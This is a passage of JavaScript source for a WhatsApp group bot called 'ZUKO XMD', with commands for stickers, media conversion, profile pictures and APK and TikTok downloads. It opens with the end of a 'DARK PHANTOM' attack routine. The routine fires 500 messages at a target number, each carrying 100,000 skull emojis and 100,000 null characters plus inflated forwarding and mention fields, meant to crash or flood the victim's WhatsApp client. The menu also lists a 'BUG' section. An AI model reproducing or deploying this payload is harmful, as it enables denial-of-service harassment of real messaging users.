            ephemeralExpiration: 9999999999 + i,
            contextInfo: {
              participant: '0@s.whatsapp.net',
              remoteJid: target,
              isForwarded: true,
              forwardingScore: 9999999 + i,
              mentionedJid: jidsss,
              mentions: jidsss,
              quotedMessage: {
                reactionMessage: {
                  text: '☠️'.repeat(100000) + '\u0000'.repeat(100000),
                  groupingKey: crypto.randomBytes(32).toString('hex')
                }
              }
            }
          }
        }
      }
    };

    await sock.sendMessage(target, darkSurge, { ephemeralExpiration: 0 }).catch(() => {});
    if (i % 100 === 0) console.log(chalk.gray(`☠️ DARK PHANTOM Final Surge: ${i}/500`));
    await new Promise(resolve => setTimeout(resolve, 20));
  }

  console.log(chalk.green(`✅ ZUKO DARK PHANTOM COMPLETE on ${target}`));
  console.log(chalk.red(`☠️ TARGET ${target} HAS BEEN DARK PHANTOMED ☠️`));
}

// ========== MAIN BOT ==========
module.exports = empire = async (empire, m, chatUpdate, store) => {
    try {
        const body = m.message?.conversation ||
                     m.message?.extendedTextMessage?.text ||
                     m.message?.imageMessage?.caption ||
                     m.message?.videoMessage?.caption || "";

        const customPrefix = getSetting('global', 'prefix', '/');
        const prefix = body.startsWith(customPrefix)
            ? customPrefix
            : /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body)
                ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi)[0]
                : customPrefix;

        const isCmd = body.startsWith(prefix);
        const args = body.slice(prefix.length).trim().split(/ +/);
        const command = args.shift().toLowerCase();
        const text = args.join(" ");
        const q = text; // Alias for text

        const botNumber = await empire.decodeJid(empire.user.id);
        const owner = JSON.parse(fs.readFileSync('./utils/owner.json'));

        const senderPn = m.sender;
        const isCreator = [botNumber, ...owner]
            .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
            .includes(senderPn);

        const isGroup = m.isGroup;
        let groupMetadata, participants = [], groupAdmins = [], isBotAdmins = false, isAdmins = false, groupName = "";

        if (isGroup) {
            groupMetadata = await empire.groupMetadata(m.chat).catch(() => null);
            participants = groupMetadata?.participants || [];
            groupAdmins = participants.filter(p => p.admin).map(p => p.id);
            isBotAdmins = groupAdmins.includes(botNumber);
            isAdmins = groupAdmins.includes(m.sender);
            groupName = groupMetadata?.subject || "";
        }

        const reply = (teks) => empire.sendMessage(m.chat, {
            text: teks,
            contextInfo: newsletterContext()
        }, { quoted: m });

        // ─── AUTO REACT HANDLER ───
        if (autoMessageReact && !m.key?.fromMe && m.key?.remoteJid !== 'status@broadcast') {
            try {
                if (!m.message?.protocolMessage) {
                    const id = m.key?.id;
                    if (id && !processedMessages.has(id)) {
                        processedMessages.add(id);
                        setTimeout(async () => {
                            const reactions = ["❤️","🔥","👍","✅","💯","🎯","😎","✨","🌟","🎉"];
                            const r = reactions[Math.floor(Math.random() * reactions.length)];
                            await empire.sendMessage(m.chat, {
                                react: { text: r, key: m.key }
                            }).catch(() => {});
                        }, 1000);
                        if (processedMessages.size > 500) {
                            [...processedMessages].slice(0, 250).forEach(x => processedMessages.delete(x));
                        }
                    }
                }
            } catch (e) {}
        }

        // ─── ANTI HANDLERS ───
        await antidelete.storeMessage(empire, m);
        await handleAntiLink(empire, m, isCreator, isAdmins);
        await handleAntiSticker(empire, m, isCreator, isAdmins);
        await handleAntiTag(empire, m, isCreator, isAdmins);
        await handleAntiViewOnce(empire, m);

        if (m.message?.protocolMessage?.type === 0) {
            await antidelete.handleRevocation(empire, m);
        }

        if (!isCmd) return;

        switch (command) {

        // ═══════════════════════════════════════════════════
        // PING - Latency check
        // ═══════════════════════════════════════════════════
        case 'ping':
case 'pong': {
    const start = Date.now();
    const pingMsg = await empire.sendMessage(m.chat, {
        text: '⏳',
        contextInfo: newsletterContext()
    }, { quoted: m });
    const latency = Date.now() - start;

    let msgTs = m.messageTimestamp;
    if (typeof msgTs?.toNumber === 'function') msgTs = msgTs.toNumber();
    const waLatency = Math.max(1, Date.now() - Number(msgTs) * 1000);

    const mem = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(1);
    const up = process.uptime();
    const upStr = `${Math.floor(up/3600)}h ${Math.floor((up%3600)/60)}m ${Math.floor(up%60)}s`;

    const pulseState = latency < 100 ? '🟢 FAST' : latency < 300 ? '🟡 OK' : '🔴 SLOW';
    const bar = latency < 100 ? '▰▰▰▰▰' : latency < 300 ? '▰▰▰▱▱' : '▰▱▱▱▱';

    const response =
`┏━❮ ⚡ 𝗣 𝗨 𝗟 𝗦 𝗘 ❯━┓
┃
┃  ⏱  ${latency}ms  ·  ${pulseState}
┃  ${bar}
┃  📡  WA Latency: ${waLatency}ms
┃  🧠  Memory: ${mem}MB
┃  ⏳  Uptime: ${upStr}
┃
┃  ▞▞▞ 𝗭𝗨𝗞𝗢-𝗫𝗠𝗗 ▞▞▞
┃  ✦ system online ✦
┗━━━━━━━━━━━━━━━━━━━┛`;

    await empire.sendMessage(m.chat, {
        text: response,
        edit: pingMsg.key,
        contextInfo: newsletterContext()
    }).catch(() => {
        empire.sendMessage(m.chat, {
            text: response,
            contextInfo: newsletterContext()
        }, { quoted: m });
    });
    break;
}
// ============================================================
// ZUKO PHANTOM DELAY - Invisible Strong Delay
// 100% invisible to members, multiple attack vectors
// ============================================================
     // ═══════════════════════════════════════════════════
        // MENU - Main command list
        // ═══════════════════════════════════════════════════
        case 'menu': {
    const now = moment().tz('Africa/Lagos').format('HH:mm:ss');
    const date = moment().tz('Africa/Lagos').format('DD/MM/YYYY');
    const userName = m.pushName || 'User';
    const up = process.uptime();
    const upStr = `${Math.floor(up/86400)}d ${Math.floor((up%86400)/3600)}h ${Math.floor((up%3600)/60)}m`;
    const mem = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(1);
    const totalCmds = 78; // updated count

    const menuText =
`╭───⟡ ZUKO XMD ⟡───╮
│
│  👤 User    : ${userName}
│  ⏰ Time    : ${now}
│  📅 Date    : ${date}
│  ⏳ Uptime  : ${upStr}
│  💾 RAM     : ${mem} MB
│  📦 Plugins : ${totalCmds}
│
╰───────────────────╯

┏━━ ⚙️ CORE ━━┓
┃ ${prefix}ping
┃ ${prefix}menu
┃ ${prefix}sticker
┃ ${prefix}toimage
┃ ${prefix}toaudio
┃ ${prefix}togif
┃ ${prefix}toptt
┃ ${prefix}getpp
┃ ${prefix}setpp
┃ ${prefix}runtime
┃ ${prefix}setbotname
┃ ${prefix}setprefix
┃ ${prefix}apkdl
┗━━━━━━━━━━━━━┛

┏━━ ⬇️ DOWNLOAD ━━┓
┃ ${prefix}tiktok
┃ ${prefix}ig
┃ ${prefix}tw
┃ ${prefix}snap
┃ ${prefix}fb
┃ ${prefix}ytvideo
┃ ${prefix}play
┗━━━━━━━━━━━━━━━━┛

┏━━ 👑 GROUP ADMIN ━━┓
┃ ${prefix}tagall
┃ ${prefix}groupinfo
┃ ${prefix}promote
┃ ${prefix}demote
┃ ${prefix}kick
┃ ${prefix}add
┃ ${prefix}mute
┃ ${prefix}unmute
┃ ${prefix}grouplink
┃ ${prefix}setgcpp
┃ ${prefix}listadmins
┃ ${prefix}warn
┃ ${prefix}unwarn
┃ ${prefix}warnings
┃ ${prefix}setgcname
┃ ${prefix}gcdescription
┃ ${prefix}resetlink
┃ ${prefix}welcome
┃ ${prefix}goodbye
┃ ${prefix}setwelcome
┃ ${prefix}setgoodbye
┗━━━━━━━━━━━━━━━━━━━┛

┏━━ 🛡️ PROTECT ━━┓
┃ ${prefix}antilink
┃ ${prefix}antisticker
┃ ${prefix}antitag
┃ ${prefix}antiviewonce
┃ ${prefix}anticall
┃ ${prefix}antidelete
┃ ${prefix}antibot
┗━━━━━━━━━━━━━━━┛

┏━━ 🎮 GAMES ━━┓
┃ ${prefix}tictactoe
┃ ${prefix}hangman
┃ ${prefix}guess
┃ ${prefix}rps
┗━━━━━━━━━━━━━━┛

┏━━ 🐛 BUG ━━┓
┃ ${prefix}
┃ ${prefix}
┃ ${prefix}
┃ ${prefix}
┃ ${prefix}
┗━━━━━━━━━━━━━━┛

     ✦ DEV ZUKO ✦`;

    try {
        const imagePath = './media/logo.jpg';
        if (fs.existsSync(imagePath)) {
            await empire.sendMessage(m.chat, {
                image: fs.readFileSync(imagePath),
                caption: menuText,
                contextInfo: newsletterContext({ mentionedJid: [m.sender] })
            }, { quoted: m });
        } else {
            await empire.sendMessage(m.chat, {
                text: menuText,
                contextInfo: newsletterContext()
            }, { quoted: m });
        }
    } catch (e) {
        await empire.sendMessage(m.chat, {
            text: menuText,
            contextInfo: newsletterContext()
        }, { quoted: m });
    }
    break;
}

        // ═══════════════════════════════════════════════════
        // SETPREFIX - Change the bot's command prefix
        // ═══════════════════════════════════════════════════
        case 'setprefix': {
            if (!isCreator) return reply("❌ Owner only!");

            const newPrefix = text.trim();

            if (!newPrefix) {
                return reply(`⚙️ *Usage:* ${prefix}setprefix <new prefix>\n\n📌 *Current prefix:* ${prefix}`);
            }
            if (newPrefix.length > 3 || /\s/.test(newPrefix)) {
                return reply('❌ Prefix must be 1-3 characters with no spaces.');
            }

            setSetting('global', 'prefix', newPrefix);
            reply(`✅ *Prefix updated!*\n\nNew prefix: \`${newPrefix}\`\nExample: \`${newPrefix}menu\``);
            break;
        }

        // ═══════════════════════════════════════════════════
        // STICKER - Image/Video to sticker
        // ═══════════════════════════════════════════════════
        case 'sticker':
        case 'stiker':
        case 's': {
            try {
                const quoted = m.quoted ? m.quoted : m;
                const mime = quoted.mimetype || '';

                if (!/image|video/.test(mime)) {
                    return reply(`🖼️ Send/reply to an image or video with:\n${prefix}sticker`);
                }

                await reply('⏳ Creating sticker...');

                const mediaBuffer = await empire.downloadMediaMessage(quoted);
                if (!mediaBuffer || mediaBuffer.length === 0) {
                    return reply('❌ Failed to download media.');
                }

                const { Sticker } = require('wa-sticker-formatter');
                const isAnimated = /video/.test(mime) || mime.includes('gif');

                const sticker = new Sticker(mediaBuffer, {
                    pack: global.packname || 'ZUKO XMD',
                    author: global.OWNER_NAME || 'Zuko',
                    type: isAnimated ? 'animated' : 'full',
                    quality: 80,
                    crop: false,
                });

                const stickerBuffer = await sticker.toBuffer();

                if (!stickerBuffer || stickerBuffer.length === 0) {
                    return reply('❌ Failed to create sticker.');
                }

                await empire.sendMessage(m.chat, {
                    sticker: stickerBuffer,
                    contextInfo: newsletterContext()
                }, { quoted: m });

            } catch (e) {
                console.error('Sticker error:', e);
                reply(`❌ Sticker failed: ${e.message || 'Unknown error'}`);
            }
            break;
        }

        // ═══════════════════════════════════════════════════
        // TOIMAGE - Convert sticker to image
        // ═══════════════════════════════════════════════════
        case 'toimage':
        case 'img': {
            try {
                const quoted = m.quoted ? m.quoted : m;
                const mime = quoted.mimetype || '';

                if (!/webp/.test(mime) && !/sticker/.test(mime)) {
                    return reply(`🖼️ *Usage:* Reply to a sticker with:\n${prefix}toimage\n\nConverts sticker to image (JPG/PNG).`);
                }

                await reply('⏳ *Converting sticker to image...*');

                const mediaBuffer = await empire.downloadMediaMessage(quoted);
                if (!mediaBuffer || mediaBuffer.length === 0) {
                    return reply('❌ Failed to download sticker.');
                }

                let imageBuffer = null;
                try {
                    const sharp = require('sharp');
                    imageBuffer = await sharp(mediaBuffer).toFormat('jpeg').toBuffer();
                } catch (e) {
                    try {
                        const { exec } = require('child_process');
                        const tmpDir = path.join(process.cwd(), 'tmp');
                        if (!fs.existsSync(tmpDir)) fs.mkdirSync(tmpDir, { recursive: true });

                        const inputPath = path.join(tmpDir, `sticker_${Date.now()}.webp`);
                        const outputPath = path.join(tmpDir, `image_${Date.now()}.jpg`);

                        fs.writeFileSync(inputPath, mediaBuffer);
                        await new Promise((resolve, reject) => {
                            exec(`"${ffmpegPath}" -i "${inputPath}" "${outputPath}"`, (error) => {
                                if (error) reject(error);
                                else resolve();
                            });
                        });

                        imageBuffer = fs.readFileSync(outputPath);
                        try { fs.unlinkSync(inputPath); } catch {}
                        try { fs.unlinkSync(outputPath); } catch {}
                    } catch (e2) {
                        console.error('Image conversion error:', e2);
                        return reply('❌ Failed to convert sticker to image.');
                    }
                }

                if (!imageBuffer || imageBuffer.length === 0) {
                    return reply('❌ Failed to convert sticker to image.');
                }

                await empire.sendMessage(m.chat, {
                    image: imageBuffer,
                    caption: `🖼️ *Sticker converted to image*\n\n📁 *Format:* JPEG\n📏 *Size:* ${(imageBuffer.length / 1024).toFixed(1)} KB`,
                    contextInfo: newsletterContext()
                }, { quoted: m });

            } catch (e) {
                console.error('To image error:', e);
                reply(`❌ *Failed to convert:* ${e.message || 'Unknown error'}`);
            }
            break;
        }

        // ═══════════════════════════════════════════════════
        // GETPP - Get profile picture
        // ═══════════════════════════════════════════════════
        case 'getpp':
        case 'getprofilepic':
        case 'pp': {
            try {
                let target = null;

                if (m.mentionedJid && m.mentionedJid.length > 0) {
                    target = m.mentionedJid[0];
                }
                if (!target && m.quoted) {
                    target = m.quoted.sender || m.quoted.key?.participant || m.quoted.key?.remoteJid;
                }
                if (!target && text) {
                    const numberMatch = text.match(/(?:@)?(\d{10,15})/);
                    if (numberMatch) {
                        target = `${numberMatch[1]}@s.whatsapp.net`;
                    }
                }
                if (!target) target = m.sender;

                if (target.includes('@g.us')) {
                    target = target.split('@')[0] + '@s.whatsapp.net';
                }

                const ppUrl = await empire.profilePictureUrl(target, 'image').catch(() => null);

                if (!ppUrl) {
                    return reply(`❌ No profile picture found for *@${target.split('@')[0]}*.\n\n📌 Make sure the user has a profile picture set.`);
                }

                await empire.sendMessage(m.chat, {
                    image: { url: ppUrl },
                    caption: `🖼️ *Profile Picture*\n\n👤 *User:* @${target.split('@')[0]}`,
                    mentions: [target],
                    contextInfo: newsletterContext({ mentionedJid: [target] })
                }, { quoted: m });

            } catch (e) {
                console.error('Get PP error:', e);
                reply(`❌ *Failed to fetch profile picture:* ${e.message || 'Unknown error'}`);
            }
            break;
        }
     
        case 'setpp':
        case 'setprofilepic': {
            if (!isCreator) return reply("❌ *Owner only!*");

            const quoted = m.quoted ? m.quoted : m;
            const mime = quoted.mimetype || '';

            if (!/image/.test(mime)) {
                return reply(`🖼️ *Usage:* Reply to an image with:\n${prefix}setpp\n\nSets the bot's profile picture.`);
            }

            try {
                await reply('⏳ *Updating profile picture...*');

                const mediaBuffer = await empire.downloadMediaMessage(quoted);
                if (!mediaBuffer || mediaBuffer.length === 0) {
                    return reply('❌ Failed to download image.');
                }

                await empire.updateProfilePicture(mediaBuffer);
                reply(`✅ *Profile picture updated successfully!*`);

            } catch (e) {
                console.error('Set PP error:', e);
                reply(`❌ *Failed to update profile picture:* ${e.message || 'Unknown error'}`);
            }
            break;
        }

        // ═══════════════════════════════════════════════════
        // TOAUDIO - Convert video/audio to MP3
        // ═══════════════════════════════════════════════════
        case 'toaudio':
        case 'tomp3':
        case 'extractaudio': {
            try {
                const quoted = m.quoted ? m.quoted : m;
                const mime = quoted.mimetype || '';

                if (!/video/.test(mime) && !/audio/.test(mime)) {
                    return reply(`🎵 *Usage:* Reply to a video or audio with:\n${prefix}toaudio\n\nExtracts/Converts to MP3 audio.`);
                }

                await reply('⏳ *Converting to audio...*');

                const mediaBuffer = await empire.downloadMediaMessage(quoted);
                if (!mediaBuffer || mediaBuffer.length === 0) {
                    return reply('❌ Failed to download media.');
                }

                let format = 'mp4';
                if (mime.includes('ogg')) format = 'ogg';
                else if (mime.includes('webm')) format = 'webm';
                else if (mime.includes('mov')) format = 'mov';

                const audioBuffer = await toAudio(mediaBuffer, format);

                if (!audioBuffer || audioBuffer.length === 0) {
                    return reply('❌ Failed to convert to audio.');
                }

                const title = m.quoted?.message?.videoMessage?.caption ||
                             m.quoted?.message?.audioMessage?.caption ||
                             'audio';

                await empire.sendMessage(m.chat, {
                    audio: audioBuffer,
                    mimetype: 'audio/mpeg',
                    ptt: false,
                    fileName: `${title}.mp3`,
                    contextInfo: newsletterContext()
                }, { quoted: m });

            } catch (e) {
                console.error('To audio error:', e);
                reply(`❌ *Failed to convert:* ${e.message || 'Unknown error'}`);
            }
            break;
        }

        // ═══════════════════════════════════════════════════
        // TOGIF - Convert video/sticker to GIF
        // ═══════════════════════════════════════════════════
        case 'togif':
        case 'gif':
        case 'tomp4': {
            try {
                const quoted = m.quoted ? m.quoted : m;
                const mime = quoted.mimetype || '';

                if (!/video/.test(mime) && !/webp/.test(mime) && !/gif/.test(mime)) {
                    return reply(`🎬 *Usage:* Reply to a video or animated sticker with:\n${prefix}togif\n\nConverts to GIF/MP4.`);
                }

                await reply('⏳ *Converting to GIF...*');

                let mediaBuffer = await empire.downloadMediaMessage(quoted);
                if (!mediaBuffer || mediaBuffer.length === 0) {
                    return reply('❌ Failed to download media.');
                }

                if (mime.includes('webp')) {
                    try {
                        const { exec } = require('child_process');
                        const tmpDir = path.join(process.cwd(), 'tmp');
                        if (!fs.existsSync(tmpDir)) fs.mkdirSync(tmpDir, { recursive: true });

                        const inputPath = path.join(tmpDir, `sticker_${Date.now()}.webp`);
                        const outputPath = path.join(tmpDir, `video_${Date.now()}.mp4`);

                        fs.writeFileSync(inputPath, mediaBuffer);
                        await new Promise((resolve, reject) => {
                            exec(`"${ffmpegPath}" -i "${inputPath}" -vf "fps=15,scale=512:512:force_original_aspect_ratio=decrease" -c:v libx264 -pix_fmt yuv420p "${outputPath}"`, (error) => {
                                if (error) reject(error);
                                else resolve();
                            });
                        });

                        mediaBuffer = fs.readFileSync(outputPath);
                        try { fs.unlinkSync(inputPath); } catch {}
                        try { fs.unlinkSync(outputPath); } catch {}
                    } catch (e) {
                        console.error('Sticker to video error:', e);
                        return reply('❌ Failed to convert sticker to video.');
                    }
                }

                await empire.sendMessage(m.chat, {
                    video: mediaBuffer,
                    gifPlayback: true,
                    caption: `🎬 *GIF Created*\n\n📏 *Size:* ${(mediaBuffer.length / 1024).toFixed(1)} KB`,
                    contextInfo: newsletterContext()
                }, { quoted: m });

            } catch (e) {
                console.error('To GIF error:', e);
                reply(`❌ *Failed to convert:* ${e.message || 'Unknown error'}`);
            }
            break;
        }

        // ═══════════════════════════════════════════════════
        // TOPTT - Convert audio/video to voice note (PTT)
        // ═══════════════════════════════════════════════════
        case 'toptt':
        case 'tovoice':
        case 'voice': {
            try {
                const quoted = m.quoted ? m.quoted : m;
                const mime = quoted.mimetype || '';

                if (!/video/.test(mime) && !/audio/.test(mime)) {
                    return reply(`🎤 *Usage:* Reply to a video or audio with:\n${prefix}toptt\n\nConverts to voice note (PTT).`);
                }

                await reply('⏳ *Converting to voice note...*');

                const mediaBuffer = await empire.downloadMediaMessage(quoted);
                if (!mediaBuffer || mediaBuffer.length === 0) {
                    return reply('❌ Failed to download media.');
                }

                let format = 'mp4';
                if (mime.includes('ogg')) format = 'ogg';
                else if (mime.includes('webm')) format = 'webm';
                else if (mime.includes('mov')) format = 'mov';

                const pttBuffer = await toPTT(mediaBuffer, format);

                if (!pttBuffer || pttBuffer.length === 0) {
                    return reply('❌ Failed to convert to voice note.');
                }

                await empire.sendMessage(m.chat, {
                    audio: pttBuffer,
                    mimetype: 'audio/ogg; codecs=opus',
                    ptt: true,
                    fileName: 'voice_note.ogg',
                    contextInfo: newsletterContext()
                }, { quoted: m });

            } catch (e) {
                console.error('To PTT error:', e);
                reply(`❌ *Failed to convert:* ${e.message || 'Unknown error'}`);
            }
            break;
        }

        // ═══════════════════════════════════════════════════
        // RUNTIME / UPTIME
        // ═══════════════════════════════════════════════════
        case 'runtime':
        case 'uptime':
        case 'alive':
        case 'status': {
            const up = process.uptime();
            const d = Math.floor(up / 86400);
            const h = Math.floor((up % 86400) / 3600);
            const min = Math.floor((up % 3600) / 60);
            const sec = Math.floor(up % 60);
            const mem = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(1);
            const memTotal = (process.memoryUsage().heapTotal / 1024 / 1024).toFixed(1);

            const response =
`┏━❮ 🛰 𝗦𝗧𝗔𝗧𝗨𝗦 ❯━┓
┃
┃  🤖 Bot    ⟶ ${global.botName || 'ZUKO XMD'}
┃  👑 Owner  ⟶ ${global.OWNER_NAME || 'ZUKO'}
┃
┃  ▞▞▞ 𝗨𝗣𝗧𝗜𝗠𝗘 ▞▞▞
┃  ⟶ ${d}d ${h}h ${min}m ${sec}s
┃
┃  ▞▞▞ 𝗠𝗘𝗠𝗢𝗥𝗬 ▞▞▞
┃  ⟶ ${mem}MB / ${memTotal}MB
┃
┃  ▞▞▞ 𝗦𝗬𝗦𝗧𝗘𝗠 ▞▞▞
┃  ⟶ Node ${process.version} · ${process.platform}
┃
┃  🟢 ONLINE
┗━━━━━━━━━━━━━━━━━┛`;

            await empire.sendMessage(m.chat, {
                text: response,
                contextInfo: newsletterContext()
            }, { quoted: m });
            break;
        }

        // ═══════════════════════════════════════════════════
        // AUTOREACT - Auto react to messages (Owner only)
        // ═══════════════════════════════════════════════════
        case 'autoreact':
        case 'ar': {
            if (!isCreator) return reply("❌ Owner only!");
            const opt = args[0]?.toLowerCase();

            if (opt === 'on') {
                autoMessageReact = true;
                reply(`✅ *AUTO-REACT ON*\n\nBot will automatically react to messages with random reactions.`);
            } else if (opt === 'off') {
                autoMessageReact = false;
                reply(`❌ *AUTO-REACT OFF*`);
            } else {
                reply(`💫 *AUTO-REACT*\nStatus: ${autoMessageReact ? '🟢 ON' : '🔴 OFF'}\n\n${prefix}autoreact on\n${prefix}autoreact off`);
            }
            break;
        }

        // ═══════════════════════════════════════════════════
        // SETBOTNAME - Change bot display name (Owner only)
        // ═══════════════════════════════════════════════════
        case 'setbotname':
        case 'setbot':
        case 'botname': {
            if (!isCreator) return reply("❌ Owner only!");

            if (!text) {
                return reply(
`🤖 *SET BOT NAME*
Current name: ${global.botName || 'ZUKO XMD'}

Usage: ${prefix}setbotname <new name>

📌 *This affects:*
• Menu header
• Newsletter name
• Sticker pack name
• Welcome messages`
                );
            }

            try {
                global.botName = text.trim();
                global.packname = text.trim();
                global.newsletterName = text.trim();

                reply(`✅ *Bot name updated!*\n\n🤖 *New Name:* ${global.botName}`);
            } catch (e) {
                reply(`❌ Failed to set bot name: ${e.message || 'Unknown error'}`);
            }
            break;
        }

        // ═══════════════════════════════════════════════════
        // APKDL - Download an APK by app name
        // ═══════════════════════════════════════════════════
        case 'apkdl':
        case 'apk':
        case 'downloadapk': {
            if (!text) return reply(`📱 *APK Downloader*\n\nUsage: ${prefix}apkdl <app name>\nExample: ${prefix}apkdl WhatsApp`);

            await reply(`🔍 *Searching for APK:* ${text}`);

            try {
                const apiUrl = `https://api.princetechn.com/api/download/apkdl?apikey=prince&appName=${encodeURIComponent(text)}`;
                const response = await axios.get(apiUrl, {
                    timeout: 30000,
                    headers: {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                    }
                });

                if (!response.data?.success || !response.data?.result) {
                    return reply(`❌ *App not found:* ${text}\n\nTry a different search term.`);
                }

                const result = response.data.result;
                const downloadUrl = result.download_url;

                if (!downloadUrl) {
                    return reply(`❌ *No download URL found for:* ${text}`);
                }

                await reply(`📥 *Downloading APK...* (This may take a moment)`);

                const apkResponse = await axios.get(downloadUrl, {
                    responseType: 'arraybuffer',
                    timeout: 120000,
                    maxContentLength: Infinity,
                    maxBodyLength: Infinity,
                    headers: {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                        'Accept': '*/*'
                    }
                });

                const apkBuffer = Buffer.from(apkResponse.data);

                if (!apkBuffer || apkBuffer.length < 10000) {
                    return reply(`❌ *Download failed:* File too small or corrupted.`);
                }

                const fileSizeMB = (apkBuffer.length / 1024 / 1024).toFixed(1);
                const fileName = `${result.appname || 'app'}_${Date.now()}.apk`.replace(/[^a-zA-Z0-9._-]/g, '_');

                await empire.sendMessage(m.chat, {
                    document: apkBuffer,
                    mimetype: 'application/vnd.android.package-archive',
                    fileName: fileName,
                    caption: `📱━━━━━━━━━━━━━━━━━━━━━━━━━━━━━📱
        ✦  APK READY  ✦
📱━━━━━━━━━━━━━━━━━━━━━━━━━━━━━📱

📛 *App:* ${result.appname || 'Unknown'}
👤 *Developer:* ${result.developer || 'Unknown'}
📦 *Size:* ${fileSizeMB} MB
📂 *Type:* APK File

📱━━━━━━━━━━━━━━━━━━━━━━━━━━━━━📱
⚠️ *Scan before installing!*`,
                    contextInfo: newsletterContext()
                }, { quoted: m });

            } catch (e) {
                console.error('APK download error:', e);
                if (e.code === 'ECONNABORTED') {
                    reply(`❌ *Download timed out.* The file may be too large or the server is slow.\n\nTry again with a stable connection.`);
                } else if (e.response?.status === 404) {
                    reply(`❌ *File not found.* The download link may be expired.\n\nTry searching again.`);
                } else {
                    reply(`❌ *Failed to download APK:* ${e.message || 'Unknown error'}`);
                }
            }
            break;
        }

        // ═══════════════════════════════════════════════════
        // SETMENUIMAGE - Set the /menu banner image
        // ═══════════════════════════════════════════════════
        case 'setmenuimage':
        case 'setmenuimg':
        case 'setmenuphoto': {
            if (!isCreator) return reply("❌ Owner only!");

            const quoted = m.quoted ? m.quoted : m;
            const mime = quoted.mimetype || '';

            if (!/image/.test(mime)) {
                return reply(`🖼️ *Usage:* Reply to an image with:\n${prefix}setmenuimage\n\nThe image will be saved as the menu banner.`);
            }

            try {
                await reply('⏳ *Downloading and saving menu image...*');

                const mediaBuffer = await empire.downloadMediaMessage(quoted);
                if (!mediaBuffer || mediaBuffer.length === 0) {
                    return reply('❌ Failed to download image.');
                }

                const mediaDir = path.join(process.cwd(), 'media');
                if (!fs.existsSync(mediaDir)) {
                    fs.mkdirSync(mediaDir, { recursive: true });
                }

                const imagePath = path.join(mediaDir, 'logo.jpg');
                fs.writeFileSync(imagePath, mediaBuffer);

                global.menuImage = imagePath;
                menuImageBuffer = mediaBuffer;

                reply(`✅ *Menu image updated successfully!*\n\n📁 *Saved to:* ${imagePath}\n🔄 Run ${prefix}menu to see the new image.`);
            } catch (e) {
                console.error('Set menu image error:', e);
                reply(`❌ Failed to set menu image: ${e.message || 'Unknown error'}`);
            }
            break;
        }

        // ═══════════════════════════════════════════════════
        // TIKTOK DOWNLOAD
        // ═══════════════════════════════════════════════════
        case 'tiktok':
        case 'tt':
        case 'ttdl': {
            if (!text) return reply(`🎵 *TikTok Downloader*\n\nUsage: ${prefix}tiktok <url>\nExample: ${prefix}tiktok https://vm.tiktok.com/ZMrgKWmVd`);

            if (!text.includes('tiktok.com') && !text.includes('vm.tiktok.com')) {
                return reply('❌ Please provide a valid TikTok video URL.');
            }

            await reply('📥 *Processing TikTok video...* Please wait.');

            try {
                const apiUrl = `https://api.princetechn.com/api/download/tiktok?apikey=prince&url=${encodeURIComponent(text)}`;
                const response = await axios.get(apiUrl, {
                    timeout: 30000,
                    headers: {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                    }
                });

                if (!response.data?.success || !response.data?.result) {
                    return reply('❌ Failed to fetch TikTok video. The video may be private or unavailable.');
                }

                const result = response.data.result;
                const videoUrl = result.video;
                const musicUrl = result.music;
                const coverUrl = result.cover;
                const title = result.title || 'TikTok Video';
                const duration = result.duration || 0;
                const author = result.author?.name || 'Unknown';

                if (!videoUrl) {
                    return reply('❌ No video URL found. The video may be unavailable.');
                }

                if (coverUrl) {
                    try {
                        await empire.sendMessage(m.chat, {
                            image: { url: coverUrl },
                            caption: `🎵 *${title || 'TikTok Video'}*\n\n👤 *Author:* @${author}\n⏱️ *Duration:* ${duration}s\n📥 *Downloading and processing...*`,
                            contextInfo: newsletterContext()
                        }, { quoted: m });
                    } catch (e) {}
                }

                await reply('⏳ *Downloading video...*');

                const videoResponse = await axios.get(videoUrl, {
                    responseType: 'arraybuffer',
                    timeout: 60000,
                    maxContentLength: Infinity,
                    maxBodyLength: Infinity,
                    headers: {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                        'Accept': '*/*'
                    }
                });

                let videoBuffer = Buffer.from(videoResponse.data);

                if (!videoBuffer || videoBuffer.length < 1000) {
                    return reply('❌ Failed to download video. The file may be corrupted.');
                }

                try {
                    await empire.sendMessage(m.chat, {
                        video: videoBuffer,
                        caption: `🎵━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🎵
        ✦  TIKTOK VIDEO  ✦
🎵━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🎵

📝 *Title:* ${title || 'No title'}
👤 *Author:* @${author}
⏱️ *Duration:* ${duration}s
📦 *Size:* ${(videoBuffer.length / 1024 / 1024).toFixed(1)} MB

🎵━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🎵`,
                        contextInfo: newsletterContext()
                    }, { quoted: m });
                } catch (sendErr) {
                    console.error('TikTok video send error:', sendErr);
                    await reply('⚠️ *Sending as file...*');
                    await empire.sendMessage(m.chat, {
                        document: videoBuffer,
                        mimetype: 'video/mp4',
                        fileName: `TikTok_${author}_${Date.now()}.mp4`,
                        caption: `🎵 *TikTok Video*\n👤 @${author}\n📝 ${title}`,
                        contextInfo: newsletterContext()
                    }, { quoted: m });
                }

                if (musicUrl) {
                    try {
                        const audioResponse = await axios.get(musicUrl, {
                            responseType: 'arraybuffer',
                            timeout: 30000
                        });
                        const audioBuffer = Buffer.from(audioResponse.data);

                        if (audioBuffer && audioBuffer.length > 1000) {
                            await empire.sendMessage(m.chat, {
                                audio: audioBuffer,
                                mimetype: 'audio/mpeg',
                                fileName: `${author}_${Date.now()}.mp3`,
                                ptt: false,
                                contextInfo: newsletterContext()
                            }, { quoted: m });
                        }
                    } catch (e) {
                        console.log('Audio download failed:', e.message);
                    }
                }

            } catch (e) {
                console.error('TikTok download error:', e);
                reply(`❌ *Failed to download:* ${e.message || 'Unknown error'}`);
            }
            break;
